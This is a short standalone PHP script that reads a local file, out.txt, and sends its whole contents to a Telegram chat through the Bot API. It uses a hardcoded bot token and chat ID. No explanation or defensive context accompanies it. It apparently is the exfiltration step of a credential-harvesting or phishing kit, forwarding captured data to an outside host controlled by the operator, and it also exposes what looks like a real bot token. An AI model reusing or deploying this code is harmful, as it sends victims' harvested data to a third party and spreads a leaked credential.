<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/1038421860:AAFAIg95RppKrXzTIxCRVpl1sDOt1WP0hmY/sendMessage?chat_id=609859058&text=$msg");
?>
